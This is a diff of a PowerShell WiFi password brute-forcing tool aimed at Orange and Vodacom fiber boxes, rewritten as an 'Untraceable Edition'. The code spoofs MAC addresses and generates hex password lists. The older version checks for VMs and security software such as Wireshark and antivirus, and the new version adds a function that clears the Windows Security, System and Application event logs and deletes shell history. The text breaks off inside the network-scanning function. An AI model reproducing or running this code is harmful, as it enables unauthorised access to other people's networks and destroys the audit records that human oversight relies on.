@@ -1,1084 +1,320 @@
 <#
 .SYNOPSIS
-    WiFi Security Testing Tool - Cross-Platform with MAC anonymization and security detection
+    WiFi Security Testing Tool - Untraceable Edition
     
 .DESCRIPTION
-    Professional WiFi security testing tool with Windows/Linux support, MAC spoofing,
-    hostile environment detection, and intelligent password pattern generation for
-    Orange and Vodacom fiber boxes
-    
-.PARAMETER Mode
-    Execution mode: "standard", "stealth", "aggressive"
-    
-.PARAMETER DisableMacSpoof
-    Disable MAC address changing
-    
-.PARAMETER SkipSecurityCheck
-    Skip security environment checks
-    
-.PARAMETER HexPasswordCount
-    Number of random hex passwords to generate
-    
-.PARAMETER PatternMode
-    Enable pattern-based generation for Orange/Vodacom boxes
-    
-.EXAMPLE
-    .\main.ps1 -Mode stealth -HexPasswordCount 10000 -PatternMode
+    Professional WiFi security testing tool with maximum security.
+    Supports: Windows, Ubuntu, Debian, RedHat, macOS, Linux
 #>
 
 [CmdletBinding()]
 param(
-    [ValidateSet("standard", "stealth", "aggressive")]
-    [string]$Mode = "standard",
+    [ValidateSet("standard", "stealth", "aggressive", "ghost")]
+    [string]$Mode = "ghost",
     
-    [switch]$DisableMacSpoof = $false,
-    [switch]$SkipSecurityCheck = $false,
-    [switch]$PatternMode = $true,
     [int]$HexPasswordCount = 5000
 )
 
-# Global Configuration
-$script:CONFIG = @{
-    PasswordLength = 8
-    MaxPasswords = 100000
+# Force error handling
+$ErrorActionPreference = "Stop"
+$ProgressPreference = "Continue"
+
+# ============================================
+# OS DETECTION
+# ============================================
+
+$Global:OS_TYPE = "Unknown"
+$Global:OS_NAME = "Unknown"
+
+function Initialize-OSDetection {
+    if ($env:OS -eq "Windows_NT" -or $IsWindows) {
+        $Global:OS_TYPE = "Windows"
+        $Global:OS_NAME = "Windows"
+        $Global:OS_VERSION = [System.Environment]::OSVersion.VersionString
+        
+        if ([System.Environment]::OSVersion.Version.Major -eq 10) {
+            if ([System.Environment]::OSVersion.Version.Build -ge 22000) {
+                $Global:OS_NAME = "Windows 11"
+            } else {
+                $Global:OS_NAME = "Windows 10"
+            }
+        }
+        return
+    }
+    
+    if ($IsLinux -or $PSVersionTable.Platform -eq "Unix") {
+        $Global:OS_TYPE = "Linux"
+        
+        if (Test-Path "/etc/os-release") {
+            $osInfo = @{}
+            Get-Content "/etc/os-release" | ForEach-Object {
+                if ($_ -match '^(.*?)=(.*)$') {
+                    $key = $matches[1]
+                    $value = $matches[2] -replace '"', ''
+                    $osInfo[$key] = $value
+                }
+            }
+            
+            $Global:OS_NAME = $osInfo["NAME"]
+            if ($Global:OS_NAME -match "Ubuntu") { $Global:OS_NAME = "Ubuntu" }
+            elseif ($Global:OS_NAME -match "Debian") { $Global:OS_NAME = "Debian" }
+            elseif ($Global:OS_NAME -match "Red Hat|RHEL") { $Global:OS_NAME = "RedHat" }
+            elseif ($Global:OS_NAME -match "CentOS") { $Global:OS_NAME = "CentOS" }
+            elseif ($Global:OS_NAME -match "Fedora") { $Global:OS_NAME = "Fedora" }
+            elseif ($Global:OS_NAME -match "Kali") { $Global:OS_NAME = "Kali" }
+            else { $Global:OS_NAME = "Linux" }
+        }
+        return
+    }
+    
+    if ($IsMacOS) {
+        $Global:OS_TYPE = "macOS"
+        $Global:OS_NAME = "macOS"
+        return
+    }
+}
+
+Initialize-OSDetection
+
+# ============================================
+# CONFIGURATION
+# ============================================
+
+$Global:Config = @{
+    Mode = $Mode
+    GhostMode = ($Mode -eq "ghost")
+    StealthMode = ($Mode -eq "stealth" -or $Mode -eq "ghost")
     Interface = $null
-    InterfaceGUID = $null
-    ScanTimeout = 10
-    ConnectionTimeout = 3
-    LogDirectory = if ($PSScriptRoot) { $PSScriptRoot } else { [System.IO.Path]::GetTempPath() }
-    DebugMode = $false
-    HexPasswordLength = 18
-    HexBatchSize = 5000
-    StealthMode = ($Mode -eq "stealth")
-    AggressiveMode = ($Mode -eq "aggressive")
-    PatternMode = $PatternMode
-    IsWindows = ($env:OS -eq "Windows_NT" -or $IsWindows)
-    IsLinux = ($IsLinux -or ($PSVersionTable.Platform -eq "Unix"))
-    IsMacOS = $IsMacOS
     OriginalMac = $null
-    SpoofedMac = $null
-    SecurityCheckInterval = 30
-    LastSecurityCheck = [DateTime]::MinValue
-}
-
-# ============================================
-# CLASSES
-# ============================================
-
-<#
-.SYNOPSIS
-    Manages WiFi connection state and lifecycle
-#>
-class ConnectionStateManager {
-    hidden [string]$Interface
-    hidden [string]$InterfaceGUID
-    hidden [string]$CurrentSSID
-    hidden [System.Diagnostics.Stopwatch]$Timer
-    hidden [string]$LogFile
-    hidden [string]$DebugFile
-
-    ConnectionStateManager([string]$interface, [string]$interfaceGUID, [string]$logFile, [string]$debugFile) {
-        $this.Interface = $interface
-        $this.InterfaceGUID = $interfaceGUID
-        $this.Timer = [System.Diagnostics.Stopwatch]::new()
-        $this.LogFile = $logFile
-        $this.DebugFile = $debugFile
-    }
-
-    [void] PrepareForTesting() {
-        try {
-            Write-Log "Preparing interface for testing..." "DEBUG" $this.LogFile $this.DebugFile
-            
-            if ($script:CONFIG.IsWindows) {
-                netsh wlan disconnect interface="$($this.Interface)" 2>$null | Out-Null
-            } else {
-                sudo nmcli device disconnect $this.Interface 2>$null | Out-Null
-            }
-            Start-Sleep -Milliseconds 200
-        }
-        catch {
-            Write-Log "Failed to prepare for testing: $_" "ERROR" $this.LogFile $this.DebugFile
-        }
-    }
-
-    [void] StartTimer() {
-        $this.Timer.Restart()
-    }
-
-    [timespan] GetElapsedTime() {
-        return $this.Timer.Elapsed
-    }
-
-    [void] CleanupConnection() {
-        try {
-            Write-Log "Cleaning up connection state..." "DEBUG" $this.LogFile $this.DebugFile
-            
-            if ($script:CONFIG.IsWindows) {
-                netsh wlan disconnect interface="$($this.Interface)" 2>$null | Out-Null
-            } else {
-                sudo nmcli device disconnect $this.Interface 2>$null | Out-Null
-            }
-        }
-        catch {
-            Write-Log "Cleanup error: $_" "ERROR" $this.LogFile $this.DebugFile
-        }
-    }
-}
-
-<#
-.SYNOPSIS
-    Tracks password testing progress
-#>
-class ProgressTracker {
-    hidden [DateTime]$StartTime
-    hidden [int]$TotalPasswords
-    hidden [int]$TestedPasswords
-    hidden [System.Collections.Generic.List[double]]$SpeedHistory
-    hidden [string]$LogFile
-    hidden [string]$DebugFile
-    hidden [bool]$IsComplete
-
-    ProgressTracker([int]$total, [string]$logFile, [string]$debugFile) {
-        $this.StartTime = Get-Date
-        $this.TotalPasswords = $total
-        $this.TestedPasswords = 0
-        $this.SpeedHistory = [System.Collections.Generic.List[double]]::new()
-        $this.LogFile = $logFile
-        $this.DebugFile = $debugFile
-        $this.IsComplete = $false
-    }
-
-    [void] UpdateProgress([string]$currentPassword) {
-        $this.TestedPasswords++
-        $elapsed = ([DateTime]::Now - $this.StartTime).TotalSeconds
-        
-        if ($elapsed -gt 0) {
-            $speed = $this.TestedPasswords / $elapsed
-            $this.SpeedHistory.Add($speed)
-            
-            if ($this.SpeedHistory.Count -gt 10) {
-                $this.SpeedHistory.RemoveAt(0)
-            }
-        }
-
-        $averageSpeed = ($this.SpeedHistory | Measure-Object -Average).Average
-        $percentComplete = ($this.TestedPasswords / $this.TotalPasswords) * 100
-        $remainingPasswords = $this.TotalPasswords - $this.TestedPasswords
-        $estimatedSeconds = if ($averageSpeed -gt 0) { $remainingPasswords / $averageSpeed } else { 0 }
-        $estimatedRemaining = [TimeSpan]::FromSeconds($estimatedSeconds)
-
-        $progressParams = @{
-            Activity = "Testing WiFi Passwords"
-            Status = "Testing: $currentPassword"
-            PercentComplete = [Math]::Min($percentComplete, 100)
-            CurrentOperation = ("Speed: {0:N1} p/s | Remaining: {1:hh\:mm\:ss} | Progress: {2}/{3}" -f 
-                $averageSpeed, $estimatedRemaining, $this.TestedPasswords, $this.TotalPasswords)
-        }
-
-        Write-Progress @progressParams
-        Write-Log "Progress: $($this.TestedPasswords)/$($this.TotalPasswords)" "DEBUG" $this.LogFile $this.DebugFile
-    }
-
-    [void] Complete() {
-        $this.IsComplete = $true
-        Write-Progress -Activity "Testing WiFi Passwords" -Completed
-    }
-
-    [hashtable] GetStatistics() {
-        $elapsed = ([DateTime]::Now - $this.StartTime).TotalSeconds
-        $averageSpeed = ($this.SpeedHistory | Measure-Object -Average).Average
-
-        return @{
-            ElapsedTime = [TimeSpan]::FromSeconds($elapsed)
-            TestedPasswords = $this.TestedPasswords
-            AverageSpeed = $averageSpeed
-            PercentComplete = ($this.TestedPasswords / $this.TotalPasswords) * 100
-            RemainingPasswords = $this.TotalPasswords - $this.TestedPasswords
-            IsComplete = $this.IsComplete
-        }
-    }
-}
-
-<#
-.SYNOPSIS
-    Generates hexadecimal passwords of specified length
-#>
-class HexPasswordGenerator {
-    hidden [string]$Charset = "0123456789ABCDEF"
-    hidden [int]$Length
-    hidden [System.Random]$Random
-    
-    HexPasswordGenerator([int]$length) {
-        $this.Length = $length
-        $this.Random = [System.Random]::new()
-    }
-    
-    [string] GenerateRandomHex() {
-        $result = [System.Text.StringBuilder]::new($this.Length)
-        for ($i = 0; $i -lt $this.Length; $i++) {
-            $index = $this.Random.Next(0, 16)
-            [void]$result.Append($this.Charset[$index])
-        }
-        return $result.ToString()
-    }
-    
-    [System.Collections.Generic.List[string]] GenerateBatch([int]$count) {
-        $batch = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
-        $maxAttempts = $count * 10
-        $attempts = 0
-        
-        while ($batch.Count -lt $count -and $attempts -lt $maxAttempts) {
-            $password = $this.GenerateRandomHex()
-            [void]$batch.Add($password)
-            $attempts++
-        }
-        
-        return [System.Collections.Generic.List[string]]::new($batch)
-    }
-}
-
-<#
-.SYNOPSIS
-    Security manager for detecting hostile environments
-#>
-class SecurityManager {
-    hidden [string]$LogFile
-    hidden [string]$DebugFile
-    hidden [bool]$IsStealthMode
-    
-    SecurityManager([string]$logFile, [string]$debugFile, [bool]$stealthMode) {
-        $this.LogFile = $logFile
-        $this.DebugFile = $debugFile
-        $this.IsStealthMode = $stealthMode
-    }
-    
-    [hashtable] CheckEnvironment() {
-        $results = @{
-            IsSafe = $true
-            Warnings = [System.Collections.Generic.List[string]]::new()
-            CriticalIssues = [System.Collections.Generic.List[string]]::new()
-        }
-        
-        try {
-            # VM Detection
-            $isVM = $this.DetectVirtualMachine()
-            if ($isVM) {
-                $results.Warnings.Add("Virtual machine detected")
-                if ($this.IsStealthMode) {
-                    $results.IsSafe = $false
-                    $results.CriticalIssues.Add("VM detected in stealth mode")
-                }
-            }
-            
-            # Security software detection
-            $securityProcesses = $this.DetectSecurityProcesses()
-            if ($securityProcesses.Count -gt 0) {
-                $results.Warnings.Add("Security software detected: $($securityProcesses -join ', ')")
-            }
-            
-            Write-Log "Security check completed" "DEBUG" $this.LogFile $this.DebugFile
-        }
-        catch {
-            Write-Log "Security check error: $_" "ERROR" $this.LogFile $this.DebugFile
-        }
-        
-        return $results
-    }
-    
-    hidden [bool] DetectVirtualMachine() {
-        try {
-            if ($script:CONFIG.IsWindows) {
-                $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
-                $manufacturer = $computerSystem.Manufacturer.ToLower()
-                $model = $computerSystem.Model.ToLower()
-                
-                $vmIndicators = @("vmware", "virtualbox", "xen", "kvm", "hyper-v", "parallels", "qemu")
-                foreach ($indicator in $vmIndicators) {
-                    if ($manufacturer -like "*$indicator*" -or $model -like "*$indicator*") {
-                        return $true
-                    }
-                }
-            } else {
-                $cpuinfo = Get-Content "/proc/cpuinfo" -ErrorAction SilentlyContinue
-                if ($cpuinfo -match "hypervisor|vmware|kvm|qemu") { return $true }
-            }
-        }
-        catch {
-            Write-Log "VM detection error: $_" "DEBUG" $this.LogFile $this.DebugFile
-        }
-        return $false
-    }
-    
-    hidden [System.Collections.Generic.List[string]] DetectSecurityProcesses() {
-        $detected = [System.Collections.Generic.List[string]]::new()
-        
-        try {
-            $securityProcessNames = @(
-                "wireshark", "tcpdump", "processhacker", "procmon", 
-                "fiddler", "burp", "nessus", "kaspersky", "mcafee", 
-                "symantec", "norton", "avast", "avg"
-            )
-            
-            $processes = Get-Process | Where-Object { 
-                $securityProcessNames -contains $_.ProcessName.ToLower() 
-            }
-            
-            foreach ($proc in $processes) {
-                $detected.Add($proc.ProcessName)
-            }
-        }
-        catch {
-            Write-Log "Security process detection error: $_" "DEBUG" $this.LogFile $this.DebugFile
-        }
-        
-        return $detected
-    }
+    SessionKey = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]$_})
 }
 
 # ============================================
 # UTILITY FUNCTIONS
 # ============================================
 
-<#
-.SYNOPSIS
-    Writes message to log files
-#>
-function Write-Log {
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$Message,
-        [string]$Level = "INFO",
-        [string]$LogFile,
-        [string]$DebugFile
-    )
-
+function Clear-SystemTraces {
     try {
-        if ([string]::IsNullOrEmpty($LogFile) -or [string]::IsNullOrEmpty($DebugFile)) {
-            $defaultPaths = Get-LogPaths
-            $LogFile = if ($LogFile) { $LogFile } else { $defaultPaths.LogFile }
-            $DebugFile = if ($DebugFile) { $DebugFile } else { $defaultPaths.DebugFile }
+        if ($Global:OS_TYPE -eq "Windows") {
+            wevtutil cl Security 2>$null
+            wevtutil cl System 2>$null
+            wevtutil cl Application 2>$null
+            ipconfig /flushdns | Out-Null
+            Clear-History 2>$null
+        } 
+        elseif ($Global:OS_TYPE -eq "Linux" -or $Global:OS_TYPE -eq "macOS") {
+            Remove-Item ~/.bash_history -Force -ErrorAction SilentlyContinue 2>$null
+            history -c 2>$null
         }
-
-        if ($Level -eq "DEBUG" -and -not $script:CONFIG.DebugMode) {
-            return
-        }
-
-        $logDir = Split-Path $LogFile -Parent
-        if (-not (Test-Path $logDir)) {
-            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
-        }
-
-        $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"
-
-        if ($Level -eq "DEBUG" -and $script:CONFIG.DebugMode) {
-            Add-Content -Path $DebugFile -Value $logMessage -ErrorAction Stop
-        } elseif ($Level -ne "DEBUG") {
-            Add-Content -Path $LogFile -Value $logMessage -ErrorAction Stop
-        }
-
-        switch ($Level) {
-            "ERROR"   { Write-Host $logMessage -ForegroundColor Red }
-            "WARNING" { Write-Host $logMessage -ForegroundColor Yellow }
-            "SUCCESS" { Write-Host $logMessage -ForegroundColor Green }
-            default   { }
-        }
-    }
-    catch {
-        Write-Host "Logging error: $($_.Exception.Message)" -ForegroundColor Red
-    }
+    } catch {}
 }
 
-<#
-.SYNOPSIS
-    Gets default log paths
-#>
-function Get-LogPaths {
-    param([string]$SSID = "")
+function Get-NetworkAdapters {
+    $adapters = @()
     
-    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-    $baseDir = $script:CONFIG.LogDirectory
-    
-    if ([string]::IsNullOrEmpty($SSID)) {
-        $logDir = Join-Path $baseDir "logs"
-    } else {
-        $normalizedSSID = $SSID -replace '[^\w]', '_'
-        $logDir = Join-Path $baseDir "logs\$normalizedSSID"
-    }
-    
-    if (-not (Test-Path $logDir)) {
-        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
-    }
-    
-    return @{
-        LogFile = Join-Path $logDir "scan_$timestamp.log"
-        DebugFile = Join-Path $logDir "debug_$timestamp.log"
-        PasswordFile = Join-Path $logDir "passwords_$timestamp.txt"
-        SuccessFile = Join-Path $logDir "success_$timestamp.txt"
-        WrongPasswordsFile = Join-Path $logDir "wrong_passwords.txt"
-        Timestamp = $timestamp
-    }
-}
-
-<#
-.SYNOPSIS
-    Checks for administrator/root rights
-#>
-function Test-AdminRights {
-    if ($script:CONFIG.IsWindows) {
-        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
-        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
-        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    } else {
-        return ((id -u) -eq 0)
-    }
-}
-
-<#
-.SYNOPSIS
-    Detects execution environment (Windows/Linux/macOS)
-#>
-function Get-EnvironmentInfo {
-    $info = @{
-        OS = "Unknown"
-        Version = $PSVersionTable.PSVersion.ToString()
-        IsAdmin = Test-AdminRights
-        PowerShellVersion = $PSVersionTable.PSVersion.Major
-    }
-    
-    if ($script:CONFIG.IsWindows) {
-        $info.OS = "Windows"
-        $info.WindowsVersion = [System.Environment]::OSVersion.VersionString
-    } elseif ($script:CONFIG.IsLinux) {
-        $info.OS = "Linux"
-        if (Test-Path "/etc/os-release") {
-            $osInfo = Get-Content "/etc/os-release" | ConvertFrom-StringData
-            $info.Distribution = $osInfo.PRETTY_NAME
-        }
-    } elseif ($script:CONFIG.IsMacOS) {
-        $info.OS = "macOS"
-    }
-    
-    return $info
-}
-
-<#
-.SYNOPSIS
-    Changes MAC address (MAC spoofing)
-#>
-function Set-MacAddress {
-    param(
-        [Parameter(Mandatory=$true)]
-        [string]$Interface,
-        [string]$NewMac = $null,
-        [switch]$RestoreOriginal = $false
-    )
-    
-    $adapter = Get-NetAdapter | Where-Object Name -eq $Interface
-    if (-not $adapter) {
-        Write-Host "Adapter not found: $Interface" -ForegroundColor Red
-        return $false
-    }
-
-    # Determine target MAC
-    if ($RestoreOriginal -and $script:CONFIG.OriginalMac) {
-        $targetMac = $script:CONFIG.OriginalMac
-        Write-Host "Restoring original MAC: $targetMac" -ForegroundColor Yellow
-    } elseif ($NewMac) {
-        $targetMac = $NewMac
-    } else {
-        $random = [System.Random]::new()
-        $bytes = [byte[]]::new(6)
-        $random.NextBytes($bytes)
-        $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
-        $targetMac = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
-    }
-
-    Write-Host "Attempting to change MAC to: $targetMac" -ForegroundColor Cyan
-
-    if ($script:CONFIG.IsWindows) {
-        try {
-            # 1. CHECK REGISTRY KEY BEFORE DISABLING INTERFACE
-            Write-Host "Searching registry key..." -ForegroundColor Gray
-            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
-            $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue | Where-Object { 
-                $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
-                $props -and $props.NetCfgInstanceId -eq $adapter.InterfaceGuid 
+    try {
+        if ($Global:OS_TYPE -eq "Windows") {
+            Write-Host "[DEBUG] Detecting Windows adapters..." -ForegroundColor Gray
+            
+            $netAdapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { 
+                $_.MediaType -eq "Native 802.11" -or 
+                $_.MediaType -eq "802.11" -or
+                $_.InterfaceDescription -match "wireless|wifi|wi-fi|wlan"
             }
-
-            if (-not $subKeys) {
-                throw "Could not find registry key for this adapter. Your network card may not support MAC spoofing."
-            }
-
-            # Handle case where multiple keys found
-            $targetKeyPath = if ($subKeys -is [array]) { $subKeys[0].PSPath } else { $subKeys.PSPath }
-
-            # 2. DISABLE INTERFACE
-            Write-Host "Disabling interface..." -ForegroundColor Yellow
-            Disable-NetAdapter -Name $Interface -Confirm:$false
-            Start-Sleep -Seconds 2
-
-            # 3. MODIFY REGISTRY
-            Write-Host "Modifying registry..." -ForegroundColor Gray
-            New-ItemProperty -Path $targetKeyPath -Name "NetworkAddress" -Value $targetMac.Replace(":", "") -PropertyType String -Force -ErrorAction Stop | Out-Null
-            Write-Log "Registry updated with new MAC" "DEBUG"
-
-            # 4. RE-ENABLE INTERFACE
-            Write-Host "Re-enabling interface..." -ForegroundColor Yellow
-            Enable-NetAdapter -Name $Interface -Confirm:$false
-
-            # Wait for adapter to be fully up
-            Write-Host "Waiting for initialization..." -ForegroundColor Yellow
-            $timeout = 30
-            $elapsed = 0
-            while ($elapsed -lt $timeout) {
-                Start-Sleep -Seconds 1
-                $status = Get-NetAdapter -Name $Interface | Select-Object -ExpandProperty Status
-                if ($status -eq "Up") {
-                    Write-Host "Adapter ready!" -ForegroundColor Green
-                    break
+            
+            Write-Host "[DEBUG] Found $($netAdapters.Count) potential adapters" -ForegroundColor Gray
+            
+            foreach ($adapter in $netAdapters) {
+                $adapters += [PSCustomObject]@{
+                    Name = $adapter.Name
+                    Description = $adapter.InterfaceDescription
+                    Status = $adapter.Status
+                    MacAddress = $adapter.MacAddress
+                    GUID = $adapter.InterfaceGuid
                 }
-                $elapsed++
-                Write-Host "  Waiting... ($elapsed/$timeout)" -ForegroundColor Gray
-            }
-
-            if ($elapsed -ge $timeout) {
-                throw "Adapter failed to come up within timeout period."
-            }
-
-            Start-Sleep -Seconds 3
-            $script:CONFIG.SpoofedMac = $targetMac
-            Write-Log "MAC changed successfully" "SUCCESS"
-            return $true
-
-        } catch {
-            Write-Log "Failed to change MAC: $_" "ERROR"
-            Write-Host "Failed to change MAC. Attempting to restore interface..." -ForegroundColor Red
-            
-            # RECOVERY BLOCK
-            try {
-                Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
-                Start-Sleep -Seconds 5
-                Write-Host "Interface re-enabled successfully." -ForegroundColor Green
-            } catch {
-                Write-Host "CRITICAL: Could not automatically re-enable adapter. A restart may be required." -ForegroundColor Red
-            }
-            
-            return $false
-        }
-    } else {
-        # Linux
-        try {
-            $macchanger = Get-Command macchanger -ErrorAction SilentlyContinue
-            $ip = Get-Command ip -ErrorAction SilentlyComplete
-            
-            if ($macchanger) {
-                sudo ip link set $Interface down
-                Start-Sleep -Seconds 1
-                sudo macchanger -m $targetMac $Interface
-                sudo ip link set $Interface up
-            } elseif ($ip) {
-                sudo ip link set $Interface down
-                Start-Sleep -Seconds 1
-                sudo ip link set $Interface address $targetMac
-                sudo ip link set $Interface up
-            } else {
-                throw "macchanger or ip command not found"
-            }
-            Start-Sleep -Seconds 5
-            $script:CONFIG.SpoofedMac = $targetMac
-            Write-Log "MAC address changed successfully" "SUCCESS"
-            return $true
-        } catch {
-            Write-Log "Failed to change MAC: $_" "ERROR"
-            return $false
-        }
-    }
-}
-
-<#
-.SYNOPSIS
-    Saves original MAC address
-#>
-function Save-OriginalMac {
-    param([string]$Interface)
-    
-    try {
-        if ($script:CONFIG.IsWindows) {
-            $adapter = Get-NetAdapter | Where-Object Name -eq $Interface
-            if ($adapter) {
-                $script:CONFIG.OriginalMac = $adapter.MacAddress
-                Write-Log "Original MAC saved: $($adapter.MacAddress)" "DEBUG"
-            }
-        } else {
-            $mac = cat "/sys/class/net/$Interface/address" 2>$null
-            if ($mac) {
-                $script:CONFIG.OriginalMac = $mac.Trim()
-                Write-Log "Original MAC saved: $mac" "DEBUG"
             }
         }
-    }
-    catch {
-        Write-Log "Could not save original MAC: $_" "WARNING"
-    }
-}
-
-<#
-.SYNOPSIS
-    Selects network adapter (cross-platform)
-#>
-function Select-NetworkAdapter {
-    try {
-        $adapters = @()
-        
-        if ($script:CONFIG.IsWindows) {
-            $adapters = @(Get-NetAdapter | Where-Object { 
-                $_.MediaType -eq "Native 802.11" -or $_.MediaType -eq "802.11"
-            } | ForEach-Object {
-                [PSCustomObject]@{
-                    Name = $_.Name
-                    Description = $_.InterfaceDescription
-                    Status = $_.Status
-                    MacAddress = $_.MacAddress
-                    GUID = $_.InterfaceGuid
-                    Index = $_.InterfaceIndex
-                }
-            })
-        } else {
-            $wirelessInterfaces = iw dev 2>$null | Select-String "Interface" | ForEach-Object { 
+        elseif ($Global:OS_TYPE -eq "Linux") {
+            $interfaces = iw dev 2>$null | Select-String "Interface" | ForEach-Object { 
                 ($_ -split "\s+")[1] 
             }
             
-            if (-not $wirelessInterfaces) {
-                $wirelessInterfaces = iwconfig 2>$null | Select-String "IEEE 802.11" | ForEach-Object { 
+            if (-not $interfaces) {
+                $interfaces = iwconfig 2>$null | Select-String "IEEE 802.11" | ForEach-Object { 
                     ($_ -split "\s+")[0] 
                 }
             }
             
-            foreach ($iface in $wirelessInterfaces) {
-                $mac = cat "/sys/class/net/$iface/address" 2>$null
-                $operstate = cat "/sys/class/net/$iface/operstate" 2>$null
+            foreach ($iface in $interfaces) {
+                $mac = ""
+                try { $mac = (cat "/sys/class/net/$iface/address" 2>$null).Trim() } catch {}
                 
                 $adapters += [PSCustomObject]@{
                     Name = $iface
                     Description = "Wireless Interface"
-                    Status = if ($operstate -eq "up") { "Up" } else { "Down" }
-                    MacAddress = $mac.Trim()
+                    Status = "Unknown"
+                    MacAddress = $mac
                     GUID = $iface
-                    Index = $iface
                 }
             }
         }
-
-        if ($adapters.Count -eq 0) {
-            Write-Host "`nNo wireless adapters found!" -ForegroundColor Red
-            return $null
-        }
-
-        Write-Host "`nAvailable Wireless Adapters:" -ForegroundColor Cyan
-        for ($i = 0; $i -lt $adapters.Count; $i++) {
-            $statusColor = if ($adapters[$i].Status -eq "Up") { "Green" } else { "Yellow" }
-            Write-Host "[$i] $($adapters[$i].Name) - $($adapters[$i].Description) [$($adapters[$i].Status)]" -ForegroundColor $statusColor
-            Write-Host "    MAC: $($adapters[$i].MacAddress)"
-        }
-
-        do {
-            $selection = Read-Host "`nSelect adapter (0-$($adapters.Count - 1))"
-            if ($selection -match '^\d+$' -and [int]$selection -ge 0 -and [int]$selection -lt $adapters.Count) {
-                return $adapters[[int]$selection]
+        elseif ($Global:OS_TYPE -eq "macOS") {
+            $airport = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
+            if (Test-Path $airport) {
+                $adapters += [PSCustomObject]@{
+                    Name = "en0"
+                    Description = "Wi-Fi"
+                    Status = "Unknown"
+                    MacAddress = "Unknown"
+                    GUID = "en0"
+                }
             }
-            Write-Host "Invalid selection." -ForegroundColor Red
-        } while ($true)
-        
+        }
     }
     catch {
-        Write-Host "Error selecting adapter: $_" -ForegroundColor Red
-        return $null
+        Write-Host "[ERROR] Adapter detection failed: $_" -ForegroundColor Red
+    }
+    
+    return $adapters
+}
+
+function Set-RandomMac {
+    param([string]$Interface)
+    
+    try {
+        $random = Get-Random
+        $bytes = [byte[]]::new(6)
+        (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
+        $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
+        $newMac = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
+        
+        if ($Global:OS_TYPE -eq "Windows") {
+            Disable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 2
+            
+            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
+            $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue | Where-Object { 
+                $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+                $props -and $props.NetCfgInstanceId -eq (Get-NetAdapter -Name $Interface).InterfaceGuid 
+            }
+            
+            if ($subKeys) {
+                $targetKey = if ($subKeys -is [array]) { $subKeys[0].PSPath } else { $subKeys.PSPath }
+                Set-ItemProperty -Path $targetKey -Name "NetworkAddress" -Value $newMac.Replace(":", "") -Force -ErrorAction SilentlyContinue
+            }
+            
+            Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
+            return $true
+        }
+        elseif ($Global:OS_TYPE -eq "Linux") {
+            sudo ip link set $Interface down 2>$null
+            Start-Sleep -Seconds 1
+            sudo ip link set $Interface address $newMac 2>$null
+            sudo ip link set $Interface up 2>$null
+            Start-Sleep -Seconds 2
+            return $true
+        }
+    }
+    catch {
+        return $false
     }
 }
 
-<#
-.SYNOPSIS
-    Gets available WiFi networks (cross-platform)
-#>
 function Get-WifiNetworks {
-    param(
-        [string]$LogFile, 
-        [string]$DebugFile
-    )
+    $networks = [System.Collections.Generic.List[hashtable]]::new()
     
     try {
-        Write-Log "Scanning for networks..." "INFO" $LogFile $DebugFile
-        
-        $networks = [System.Collections.Generic.List[hashtable]]::new()
-        
-        if ($script:CONFIG.IsWindows) {
-            Write-Host "`nScanning WiFi networks... Please wait..." -ForegroundColor Yellow
-            
-            # Multiple scan attempts
-            $scanAttempts = 0
-            $maxAttempts = 5
-            $rawOutput = ""
-            
-            while ($scanAttempts -lt $maxAttempts) {
-                $null = netsh wlan scan interface="$($script:CONFIG.Interface)" 2>&1
-                Start-Sleep -Seconds 3
-                
-                $rawOutput = netsh wlan show networks interface="$($script:CONFIG.Interface)" mode=Bssid 2>&1
-                
-                if ($rawOutput -match "SSID\s+\d+\s*:") {
-                    Write-Log "Scan successful on attempt $($scanAttempts + 1)" "DEBUG" $LogFile $DebugFile
-                    break
-                }
-                
-                $scanAttempts++
-                Write-Log "Scan attempt $scanAttempts returned no results, retrying..." "WARNING" $LogFile $DebugFile
-                Write-Host "  Scan attempt $scanAttempts failed, retrying..." -ForegroundColor Gray
+        if ($Global:OS_TYPE -eq "Windows") {
+            # Force scan
+            for ($i = 0; $i -lt 2; $i++) {
+                netsh wlan scan interface="$($Global:Config.Interface)" 2>&1 | Out-Null
+                Start-Sleep -Seconds 2
             }
             
-            if ($scanAttempts -ge $maxAttempts) {
-                Write-Log "All scan attempts failed. No networks found." "WARNING" $LogFile $DebugFile
-                return $null
-            }
+            $output = netsh wlan show networks interface="$($Global:Config.Interface)" mode=Bssid 2>&1
             
-            Write-Log "Raw netsh output captured" "DEBUG" $LogFile $DebugFile
-            
-            $currentNetwork = $null
-            $lineNumber = 0
-            
-            foreach ($line in $rawOutput) {
-                $lineNumber++
-                $trimmedLine = $line.Trim()
+            $current = $null
+            foreach ($line in $output) {
+                $trimmed = $line.Trim()
+                if ([string]::IsNullOrWhiteSpace($trimmed)) { continue }
                 
